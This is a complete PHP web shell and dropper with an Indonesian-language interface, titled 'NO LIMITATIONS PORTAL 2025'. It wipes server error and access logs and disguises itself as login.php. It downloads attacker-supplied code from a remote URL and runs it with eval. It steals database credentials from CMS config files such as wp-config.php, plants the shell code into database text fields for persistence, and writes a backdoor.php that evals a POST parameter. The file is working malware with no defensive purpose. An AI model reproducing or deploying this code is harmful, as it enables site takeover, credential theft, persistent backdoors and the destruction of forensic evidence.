<?php
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@ini_set('error_log', '/dev/null');

@file_put_contents('error_log', '');
@file_put_contents('access_log', '');
@file_put_contents('../error_log', '');
@file_put_contents('../access_log', '');

$current_file = __FILE__;
if (basename($current_file) !== 'login.php' && basename($current_file) !== 'index.php') {
    @copy($current_file, dirname($current_file) . '/login.php');
    @unlink($current_file);
}

session_start();

$user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
];

function auth($pass) {
    return password_verify($pass, '$2a$12$HVxA/H.iEJ/bJ3a.77UjIexsgVGU24X3tD0zuBwd2VptQOvRhcSNO');
}

// Cari config DB (lebih luas)
function find_db_config() {
    $paths = ['.', '..', '../..', '../../..'];
    $files = ['wp-config.php', 'configuration.php', 'settings.php', 'config.php', 'database.php', 'local.xml', 'env.php'];
    foreach ($paths as $p) {
        foreach ($files as $f) {
            $path = rtrim($p, '/') . '/' . $f;
            if (file_exists($path)) {
                $content = file_get_contents($path);
                if (preg_match("/DB_HOST.*?['\"]([^'\"]+)['\"]/", $content, $h) &&
                    preg_match("/DB_USER.*?['\"]([^'\"]+)['\"]/", $content, $u) &&
                    preg_match("/DB_PASSWORD.*?['\"]([^'\"]+)['\"]/", $content, $p) &&
                    preg_match("/DB_NAME.*?['\"]([^'\"]+)['\"]/", $content, $n)) {
                    return ['host'=>$h[1],'user'=>$u[1],'pass'=>$p[1],'dbname'=>$n[1],'file'=>$path];
                }
            }
        }
    }
    return false;
}

// Inject + report detail
function inject_shell_to_db($conn, $shell_code) {
    $base_url = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['SCRIPT_NAME']);
    $text_fields = ['bio', 'description', 'content', 'post_content', 'signature', 'notes', 'about', 'message', 'excerpt'];
    $primary_keys = ['id', 'ID', 'user_id', 'post_id'];

    $tables = $conn->query("SHOW TABLES");
    while ($tbl = $tables->fetch_array()) {
        $t = $tbl[0];
        $desc = $conn->query("DESCRIBE `$t`");
        $fields = [];
        $pk = 'id';
        while ($c = $desc->fetch_assoc()) {
            $fields[strtolower($c['Field'])] = $c['Field'];
            if (in_array(strtolower($c['Field']), $primary_keys) && strpos($c['Key'], 'PRI') !== false) {
                $pk = $c['Field'];
            }
        }

        foreach ($text_fields as $tf) {
            if (isset($fields[$tf]) && strpos($fields[$tf], 'text') !== false || strpos($fields[$tf], 'varchar') !== false && strlen($shell_code) < 1000) {
                $field = $fields[$tf];
                $escaped = $conn->real_escape_string($shell_code);

                // Cari record yang tidak kosong
                $check = $conn->query("SELECT `$pk` FROM `$t` WHERE `$field` != '' AND `$field` IS NOT NULL LIMIT 1");
                if ($check && $row = $check->fetch_assoc()) {
                    $id = $row[$pk];
                    $conn->query("UPDATE `$t` SET `$field` = '$escaped' WHERE `$pk` = '$id'");

                    // Tebak URL akses
                    $possible_url = "";
                    if (stripos($t, 'user') !== false || stripos($t, 'author') !== false) {
                        $possible_url = "$base_url/wp-admin/profile.php (WordPress)<br>atau $base_url/administrator/index.php?option=com_users&task=user.edit&id=$id (Joomla)<br>atau buka halaman profil user";
                    } elseif (stripos($t, 'post') !== false || stripos($t, 'content') !== false) {
                        $possible_url = "Buka halaman post dengan ID $id atau halaman blog utama";
                    } else {
                        $possible_url = "Cari record ID $id di table $t melalui admin panel";
                    }

                    return "<strong>SUKSES TANAM SHELL PERMANEN!</strong><br>
                            Table: <code>$t</code><br>
                            Field: <code>$field</code><br>
                            Record ID: <code>$id</code><br>
                            <strong>AKSES SHELL DI:</strong><br>$possible_url<br>
                            Kirim POST parameter <code>kontol</code> dengan code PHP ke URL itu.";
                }
            }
        }
    }
    return "Gagal nemu field teks yang cocok buat tanam shell.";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (auth($_POST['password'] ?? '')) {
        $_SESSION['auth'] = true;
        $custom_url = trim($_POST['scan_url'] ?? '');

        if (empty($custom_url)) {
            echo "URL shell lo kosong bro.";
            exit;
        }

        $ua = $user_agents[array_rand($user_agents)];
        $context = stream_context_create(['http'=>['header'=>"User-Agent: $ua\r\n",'timeout'=>20]]);
        $shell_content = @file_get_contents($custom_url, false, $context);

        $result = "<strong>REMOTE SHELL:</strong> $custom_url<br>";

        if ($shell_content) {
            @eval($shell_content); // optional exec
            $result .= "Shell lo dieksekusi.<br><br>";

            $cfg = find_db_config();
            if ($cfg) {
                $conn = new mysqli($cfg['host'], $cfg['user'], $cfg['pass'], $cfg['dbname']);
                if (!$conn->connect_error) {
                    $inject_res = inject_shell_to_db($conn, $shell_content);
                    $result .= $inject_res;
                } else {
                    $result .= "DB connect gagal.";
                }
            } else {
                $result .= "Gak nemu config DB.";
            }
        } else {
            $result .= "Gagal fetch shell dari URL lo.";
        }

        @file_put_contents('backdoor.php', '<?php @eval($_POST["kontol"]); ?>');

        echo "<div style='background:#000;padding:20px;color:#0f0;border:1px solid #0f0;margin:20px auto;width:80%;font-family:monospace;'>
              <h3>INJECT SELESAI</h3>$result</div>";
        exit;
    } else {
        $error = "Password salah bro.";
    }
}

if ($_SESSION['auth'] ?? false) {
    echo "Sudah login. Inject shell baru lagi kalo mau.";
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NO LIMITATIONS PORTAL 2025</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto:wght@300;500&display=swap');
        body {margin:0;padding:0;background:linear-gradient(rgba(0,0,0,0.75),rgba(0,0,0,0.85)),url('https://i.gyazo.com/58739eb83bd425207ac13ce423162669.jpg') no-repeat center center fixed;background-size:cover;color:#fff;font-family:'Roboto',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;}
        .container {max-width:900px;width:90%;padding:50px;background:rgba(10,10,30,0.7);backdrop-filter:blur(15px);border:2px solid rgba(255,215,0,0.5);border-radius:25px;box-shadow:0 0 70px rgba(255,215,0,0.4);}
        h1 {font-family:'Orbitron',sans-serif;font-size:52px;text-align:center;color:#ffd700;text-shadow:0 0 25px #ffd700;}
        .form {max-width:500px;margin:30px auto;padding:40px;background:rgba(0,0,0,0.6);border-radius:20px;border:2px solid rgba(255,215,0,0.4);}
        input[type="password"],input[type="text"]{width:100%;padding:18px;margin:15px 0;background:rgba(0,0,0,0.7);border:1px solid #ffd700;border-radius:12px;color:#fff;font-size:18px;}
        input[type="submit"]{width:100%;padding:20px;background:linear-gradient(45deg,#000,#ffd700);color:#fff;font-size:24px;font-weight:bold;border:2px solid #ffd700;border-radius:15px;cursor:pointer;}
        .error{color:#ff3366;text-align:center;font-size:26px;}
    </style>
</head>
<body>
    <div class="container">
        <h1>NO LIMITATIONS</h1>
        <h2>HANYA TUHAN YANG BISA MENGHAKIMI KAMI !</h2>
        <?php if (isset($error)): ?><div class="error"><?= $error ?></div><?php endif; ?>
        <div class="form">
            <form method="POST">
                <input type="password" name="password" placeholder="Master Code" required>
                <input type="text" name="scan_url" placeholder="URL Raw Shell Lo (GitHub raw / pastebin)" required>
                <input type="submit" value="INJECT & TANAM PERMANEN KE DB">
            </form>
        </div>
        <p style="text-align:center;color:#aaa;">Setelah inject, lo langsung dapet report table + URL akses shell permanen</p>
    </div>
</body>
</html>
